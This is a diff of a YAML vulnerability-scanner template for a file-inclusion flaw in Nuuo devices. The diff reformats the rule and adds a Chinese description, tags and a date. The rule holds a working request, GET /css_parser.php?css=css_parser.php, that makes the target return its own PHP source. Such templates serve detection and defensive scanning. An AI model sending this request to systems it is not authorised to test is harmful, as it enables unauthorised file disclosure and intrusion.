@@ -1,14 +1,19 @@
 id: nuuo-file-inclusion
 
 info:
-    name: Nuuo file inclusion
-    author: 2357000166(https://github.com/2357000166)
-    severity: high
+  name: Nuuo file inclusion
+  author: "2357000166"
+  severity: high
+  verified: true
+  description: |-
+    Nuuo 存在文件包含漏洞，攻击者可以通过构造恶意请求，包含任意文件，导致敏感信息泄露。
+  tags: nuuo,file-inclusion
+  created: 2024/06/25
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /css_parser.php?css=css_parser.php
-        expression: response.status == 200 && response.headers["content-type"] == "text/css" && response.body.bcontains(b"$_GET['css']")
+  r0:
+    request:
+      method: GET
+      path: /css_parser.php?css=css_parser.php
+    expression: response.status == 200 && response.headers["content-type"] == "text/css" && response.body.bcontains(b"$_GET['css']")
 expression: r0()
